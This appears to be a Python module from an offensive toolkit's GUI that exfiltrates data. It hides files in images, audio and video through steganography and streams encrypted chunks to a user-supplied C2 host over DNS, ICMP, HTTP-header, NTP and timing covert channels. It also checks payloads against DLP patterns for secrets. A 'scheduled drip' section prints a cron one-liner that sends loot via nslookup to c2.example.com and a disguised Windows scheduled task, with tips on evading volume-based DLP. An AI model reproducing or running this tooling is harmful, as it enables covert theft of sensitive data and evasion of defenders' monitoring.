# language: Python, file: modules/exfil.py
# advanced exfiltration — stego + covert channels + DLP bypass
import customtkinter as ctk
import threading
import os
import subprocess
import time
from utils.progress import ProgressTracker
from utils.stego import ImageStego, AudioStego, VideoStego, encrypt_payload
from utils.channels import (DNSChannel, ICMPChannel, HTTPHeaderChannel,
                            NTPChannel, TimingChannel, HeaderOrderChannel,
                            RotatingChannel)


class ExfilModule:
    def __init__(self, log_queue):
        self.log = log_queue
        self.name = "exfil"
        self.progress = ProgressTracker(log_queue)

    def render(self, parent):
        ctk.CTkLabel(
            parent, text="ADVANCED EXFILTRATION",
            font=ctk.CTkFont(size=18, weight="bold"), text_color="#00ff9c"
        ).pack(pady=(20, 4), padx=24, anchor="w")
        ctk.CTkLabel(
            parent, text="steganography · DNS/ICMP/HTTP covert · timing · DLP bypass",
            font=ctk.CTkFont(size=11), text_color="#4a5568"
        ).pack(pady=(0, 12), padx=24, anchor="w")

        # ---- source config ----
        cfg = ctk.CTkFrame(parent, fg_color="#0d1319", corner_radius=6)
        cfg.pack(fill="x", padx=24)

        r1 = ctk.CTkFrame(cfg, fg_color="transparent")
        r1.pack(fill="x", padx=12, pady=8)
        self.src_e = ctk.CTkEntry(r1, placeholder_text="source file/dir",
                                  width=300, height=32,
                                  fg_color="#05080c", border_color="#1a2332")
        self.src_e.pack(side="left", padx=(0, 6))
        self.carrier_e = ctk.CTkEntry(r1, placeholder_text="carrier (img/wav/mp4)",
                                      width=260, height=32,
                                      fg_color="#05080c", border_color="#1a2332")
        self.carrier_e.pack(side="left", padx=(0, 6))
        self.c2_e = ctk.CTkEntry(r1, placeholder_text="C2 domain/ip",
                                 width=200, height=32,
                                 fg_color="#05080c", border_color="#1a2332")
        self.c2_e.pack(side="left")

        r2 = ctk.CTkFrame(cfg, fg_color="transparent")
        r2.pack(fill="x", padx=12, pady=(0, 10))
        self.method = ctk.CTkOptionMenu(
            r2, values=["lsb-image", "dct-image", "audio-lsb", "video-append",
                        "dns", "icmp", "http-header", "ntp", "timing",
                        "header-order", "rotating"],
            width=180, fg_color="#1a2332", button_color="#1a2332"
        )
        self.method.pack(side="left", padx=(0, 6))
        self.encrypt_chk = ctk.CTkCheckBox(
            r2, text="AES-256-GCM encrypt", fg_color="#0d2818",
            hover_color="#1a4a2e", text_color="#c8d6e5"
        )
        self.encrypt_chk.select()
        self.encrypt_chk.pack(side="left", padx=(0, 6))
        self.chunk_e = ctk.CTkEntry(r2, placeholder_text="chunk size (bytes)",
                                    width=180, height=32,
                                    fg_color="#05080c", border_color="#1a2332")
        self.chunk_e.insert(0, "4096")
        self.chunk_e.pack(side="left", padx=(0, 6))
        self.delay_e = ctk.CTkEntry(r2, placeholder_text="delay between chunks (s)",
                                    width=200, height=32,
                                    fg_color="#05080c", border_color="#1a2332")
        self.delay_e.insert(0, "1")
        self.delay_e.pack(side="left")

        # ---- actions ----
        ctk.CTkLabel(parent, text="Operations:",
                     font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(12, 4), padx=24, anchor="w")

        grid = ctk.CTkFrame(parent, fg_color="transparent")
        grid.pack(fill="x", padx=24)

        actions = [
            ("▸ Embed in carrier", self._embed),
            ("▸ Extract from carrier", self._extract),
            ("▸ Stream via channel", self._stream),
            ("▸ Multi-channel broadcast", self._broadcast),
            ("▸ Dir → carrier chunks", self._dir_to_carriers),
            ("▸ DLP test (regex)", self._dlp_test),
            ("▸ Split & fanout", self._fanout),
            ("▸ Scheduled drip", self._scheduled_drip),
        ]
        for i, (label, fn) in enumerate(actions):
            ctk.CTkButton(
                grid, text=label, width=220, height=34,
                fg_color="#141a22", hover_color="#1a2332",
                font=ctk.CTkFont(size=11), command=fn
            ).grid(row=i // 4, column=i % 4, padx=4, pady=4)

        # ---- progress + output ----
        self.bars = ctk.CTkFrame(parent, fg_color="#0d1319", corner_radius=6)
        self.bars.pack(fill="x", padx=24, pady=(12, 0))

        ctk.CTkLabel(parent, text="Output:",
                     font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(12, 4), padx=24, anchor="w")
        self.out = ctk.CTkTextbox(
            parent, fg_color="#05080c", text_color="#7dffb0",
            font=ctk.CTkFont(family="Consolas", size=10), height=260
        )
        self.out.pack(fill="both", expand=True, padx=24, pady=(0, 12))

        self._poll_bars()

    def _poll_bars(self):
        for w in self.bars.winfo_children():
            w.destroy()
        for tid, t in list(self.progress.snapshot().items())[:5]:
            row = ctk.CTkFrame(self.bars, fg_color="transparent")
            row.pack(fill="x", padx=8, pady=2)
            ctk.CTkLabel(row, text=t["label"][:45], width=300, anchor="w",
                         font=ctk.CTkFont(size=10),
                         text_color="#c8d6e5").pack(side="left")
            b = ctk.CTkProgressBar(row, width=200, height=10,
                                   progress_color="#00ff9c")
            if t["total"]:
                b.set(min(t["current"]/t["total"], 1.0))
            else:
                b.set(0.5 if t["status"] == "running" else 1.0)
            b.pack(side="left", padx=(0, 8))
            ctk.CTkLabel(row, text=t.get("detail", "")[:60],
                         font=ctk.CTkFont(size=9),
                         text_color="#4a5568").pack(side="left")
        self.bars.after(500, self._poll_bars)

    def _out(self, text):
        self.out.insert("end", text + "\n")
        self.out.see("end")

    # ==================== embed / extract ====================
    def _embed(self):
        src = self.src_e.get().strip()
        carrier = self.carrier_e.get().strip()
        method = self.method.get()
        if not src or not carrier:
            self.log.put("[exfil] source + carrier required")
            return

        try:
            with open(src, "rb") as f:
                payload = f.read()
        except Exception as e:
            self.log.put(f"[exfil] read err: {e}")
            return

        if self.encrypt_chk.get():
            payload = encrypt_payload(payload)
            self._out("[exfil] payload encrypted (AES-256-GCM)")

        tid = f"embed-{int(time.time())}"
        self.progress.start(tid, f"Embed {method}",
                            total=len(payload))

        def run():
            try:
                out = f"{src}.stego"
                if method == "lsb-image":
                    ImageStego.hide_lsb(carrier, payload, out)
                elif method == "dct-image":
                    ImageStego.hide_dct(carrier, payload, out)
                elif method == "audio-lsb":
                    AudioStego.hide(carrier, payload, out)
                elif method == "video-append":
                    VideoStego.hide(carrier, payload, out)
                else:
                    self.log.put(f"[exfil] {method} not an embed method")
                    return
                size = os.path.getsize(out)
                self._out(f"[+] carrier written: {out} ({size} bytes)")
                self.log.put(f"[exfil] embed OK → {out}")
                self.progress.finish(tid, detail=f"{size} bytes")
            except Exception as e:
                self.log.put(f"[exfil] embed err: {e}")
                self.progress.finish(tid, "failed", str(e))

        threading.Thread(target=run, daemon=True).start()

    def _extract(self):
        carrier = self.carrier_e.get().strip()
        method = self.method.get()
        if not carrier:
            return

        def run():
            try:
                if method == "lsb-image":
                    data = ImageStego.extract_lsb(carrier)
                elif method == "audio-lsb":
                    data = AudioStego.extract(carrier)
                elif method == "video-append":
                    data = VideoStego.extract(carrier)
                else:
                    self.log.put(f"[exfil] extract not supported for {method}")
                    return
                out = carrier + ".extracted"
                with open(out, "wb") as f:
                    f.write(data)
                self._out(f"[+] extracted: {out} ({len(data)} bytes)")
                self.log.put(f"[exfil] extract OK → {out}")
            except Exception as e:
                self.log.put(f"[exfil] extract err: {e}")

        threading.Thread(target=run, daemon=True).start()

    # ==================== channel streaming ====================
    def _get_channel(self, method):
        c2 = self.c2_e.get().strip()
        if method == "dns":
            return DNSChannel(c2)
        if method == "icmp":
            return ICMPChannel(c2)
        if method == "http-header":
            return HTTPHeaderChannel(f"http://{c2}/")
        if method == "ntp":
            return NTPChannel(c2)
        if method == "timing":
            return TimingChannel(c2)
        if method == "header-order":
            return HeaderOrderChannel(f"http://{c2}/")
        if method == "rotating":
            return RotatingChannel([
                DNSChannel(c2), ICMPChannel(c2),
                HTTPHeaderChannel(f"http://{c2}/"),
                NTPChannel(c2)
            ])
        return None

    def _stream(self):
        src = self.src_e.get().strip()
        if not src or not os.path.exists(src):
            self.log.put("[exfil] source required")
            return

        with open(src, "rb") as f:
            data = f.read()
        if self.encrypt_chk.get():
            data = encrypt_payload(data)

        method = self.method.get()
        channel = self._get_channel(method)
        if not channel:
            self.log.put(f"[exfil] no channel for {method}")
            return

        chunk_size = int(self.chunk_e.get() or 4096)
        delay = float(self.delay_e.get() or 1)
        session = os.urandom(4).hex()

        tid = f"stream-{int(time.time())}"
        chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
        self.progress.start(tid, f"Stream {method}", total=len(chunks))

        def run():
            self._out(f"[exfil] streaming {len(chunks)} chunks via {method} "
                      f"(session {session})")
            for i, chunk in enumerate(chunks):
                # prepend chunk index + total for reassembly
                framed = i.to_bytes(4, "big") + len(chunks).to_bytes(4, "big") + chunk
                try:
                    channel.send(framed)
                except Exception as e:
                    self.log.put(f"[exfil] chunk {i} err: {e}")
                self.progress.update(tid, increment=1,
                                     detail=f"{i+1}/{len(chunks)}")
                time.sleep(delay)
            self.progress.finish(tid, detail="stream complete")
            self._out(f"[+] stream done ({len(chunks)} chunks)")

        threading.Thread(target=run, daemon=True).start()

    def _broadcast(self):
        """send on all channels simultaneously"""
        src = self.src_e.get().strip()
        c2 = self.c2_e.get().strip()
        if not src:
            return
        with open(src, "rb") as f:
            data = f.read()
        if self.encrypt_chk.get():
            data = encrypt_payload(data)

        channels = RotatingChannel([
            DNSChannel(c2), ICMPChannel(c2),
            HTTPHeaderChannel(f"http://{c2}/"),
            NTPChannel(c2)
        ])

        tid = f"bc-{int(time.time())}"
        self.progress.start(tid, "Broadcast all channels", total=1)

        def run():
            res = channels.broadcast(data)
            for i, r in enumerate(res):
                self._out(f"channel {i}: {len(r) if isinstance(r, bytes) else r} bytes")
            self.progress.finish(tid, detail=f"{len(res)} channels")

        threading.Thread(target=run, daemon=True).start()

    def _dir_to_carriers(self):
        """hide every file in a directory into its own carrier copy"""
        src = self.src_e.get().strip()
        carrier = self.carrier_e.get().strip()
        if not os.path.isdir(src) or not os.path.isfile(carrier):
            self.log.put("[exfil] src must be dir + carrier must be file")
            return

        os.makedirs("stego_out", exist_ok=True)
        files = [f for f in os.listdir(src)
                 if os.path.isfile(os.path.join(src, f))]
        tid = f"dir-{int(time.time())}"
        self.progress.start(tid, f"Dir → carriers ({len(files)} files)",
                            total=len(files))

        def run():
            for i, fname in enumerate(files):
                with open(os.path.join(src, fname), "rb") as f:
                    payload = f.read()
                if self.encrypt_chk.get():
                    payload = encrypt_payload(payload)
                out = f"stego_out/{fname}.png"
                try:
                    ImageStego.hide_lsb(carrier, payload, out)
                    self._out(f"[+] {fname} → {out}")
                except Exception as e:
                    self.log.put(f"[exfil] {fname}: {e}")
                self.progress.update(tid, increment=1, detail=fname)
            self.progress.finish(tid, detail="all files embedded")

        threading.Thread(target=run, daemon=True).start()

    # ==================== DLP test ====================
    def _dlp_test(self):
        """test if payload would trigger common DLP regexes"""
        src = self.src_e.get().strip()
        if not src or not os.path.exists(src):
            return
        with open(src, "rb") as f:
            data = f.read()

        patterns = {
            "SSN": rb"\d{3}-\d{2}-\d{4}",
            "credit card": rb"\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}",
            "AWS key": rb"AKIA[0-9A-Z]{16}",
            "private key": rb"-----BEGIN [A-Z ]+PRIVATE KEY-----",
            "JWT": rb"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+",
            "email": rb"[\w\.-]+@[\w\.-]+\.\w+",
            "password field": rb"(?i)password\s*[:=]\s*\S+",
        }
        import re
        self._out("\n=== DLP scan ===\n")
        for name, pat in patterns.items():
            matches = re.findall(pat, data)
            if matches:
                self._out(f"[!] {name}: {len(matches)} matches — will be flagged")
            else:
                self._out(f"[+] {name}: clean")

    def _fanout(self):
        """split file into N parts, send each via different channel"""
        src = self.src_e.get().strip()
        c2 = self.c2_e.get().strip()
        if not src:
            return
        with open(src, "rb") as f:
            data = f.read()
        if self.encrypt_chk.get():
            data = encrypt_payload(data)

        n = 4
        chunks = [data[i::n] for i in range(n)]  # interleaved for reassembly
        channels = [
            DNSChannel(c2),
            ICMPChannel(c2),
            HTTPHeaderChannel(f"http://{c2}/"),
            NTPChannel(c2),
        ]

        tid = f"fan-{int(time.time())}"
        self.progress.start(tid, "Fanout 4 channels", total=n)

        def run():
            for i, (ch, chunk) in enumerate(zip(channels, chunks)):
                self._out(f"[exfil] channel {i}: {len(chunk)} bytes")
                try:
                    ch.send(chunk)
                except Exception as e:
                    self.log.put(f"[exfil] ch{i}: {e}")
                self.progress.update(tid, increment=1)
            self.progress.finish(tid, detail="fanout complete")

        threading.Thread(target=run, daemon=True).start()

    def _scheduled_drip(self):
        """slow exfil over hours/days — evades volume-based DLP"""
        self._out("""
=== Scheduled drip ===
Sets up a cron/systemd timer that exfils small chunks hourly.

Linux:
  @hourly /usr/local/bin/drip.sh
  drip.sh: dd if=/tmp/loot bs=4k skip=$((RANDOM % 1000)) count=1 | \
           nslookup $(base32 | head -c 60).c2.example.com

Windows:
  schtasks /create /tn SysHealth /tr "powershell -f C:\\Windows\\Temp\\drip.ps1" /sc hourly

Drip patterns:
  - 4KB/hour = ~100MB/month per host
  - random jitter ±30min
  - business hours only (9-17 local)
  - rotate C2 endpoints weekly
""")

    # ==================== integration helpers ====================
    def exfil_file(self, path, method="lsb-image", carrier=None, c2=None):
        """programmatic API — called from other modules (LAN, AD, etc.)"""
        with open(path, "rb") as f:
            data = f.read()
        if self.encrypt_chk.get():
            data = encrypt_payload(data)

        if method.startswith(("lsb", "dct", "audio", "video")):
            if not carrier:
                return None
            out = f"/tmp/exfil_{os.path.basename(path)}.stego"
            if method == "lsb-image":
                ImageStego.hide_lsb(carrier, data, out)
            elif method == "audio-lsb":
                AudioStego.hide(carrier, data, out)
            return out
        else:
            ch = self._get_channel(method)
            if ch:
                ch.send(data)
        return None
